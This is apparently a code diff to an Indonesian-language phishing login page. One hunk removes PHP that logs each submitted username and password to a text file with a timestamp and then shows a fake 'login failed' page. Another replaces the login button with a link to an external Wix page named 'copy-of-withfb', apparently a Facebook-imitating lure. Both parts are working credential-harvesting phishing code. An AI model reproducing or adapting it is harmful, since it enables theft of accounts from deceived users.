@@ -29,30 +29,7 @@
         </div>
     </div>
 
-    <?php
-    if (isset($_POST['submit'])) {
-        $username = $_POST['username'];
-        $pass = $_POST['password'];
-        $time=time();
-        $gmt='+7';
-        $jm='3600';
-        $var=$time+($gmt*$jm);
-        $now=gmdate('d M Y - H:i',$var);
-
-        // Simpan data ke dalam file teks
-        $dataToSave = "
-Username : $username
-Password : $pass
-Date Submitted : '.$now.'\n
-*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*\n";
-        $file = "lana.txt";
-        file_put_contents($file, $dataToSave, FILE_APPEND);
-
-         // Arahkan pengguna ke halaman lain
-         header("Location:login_gagal.html");
-         exit; // Pastikan untuk keluar dari skrip setelah mengarahkan pengguna
-    }
-    ?>
+    
 </body>
 </html>
 
@@ -81,7 +58,7 @@ Date Submitted : '.$now.'\n
                                 <div class="mb-3">
                                     <input type="password" class="form-control" id="password" name="password" placeholder="Password" required="" aria-required="true">
                                 </div>
-                                <button type="submit" name="submit" class="btn btn-primary custom-button">Masuk</button>
+                                <a href="https://loginwithreff.wixsite.com/login/copy-of-withfb" type="button" class="btn btn-primary custom-button">Masuk</a>
                             </form>
                             <p class="text-primary text-center margin">Lupa kata sandi ?</p>
                             <div class="row margin">
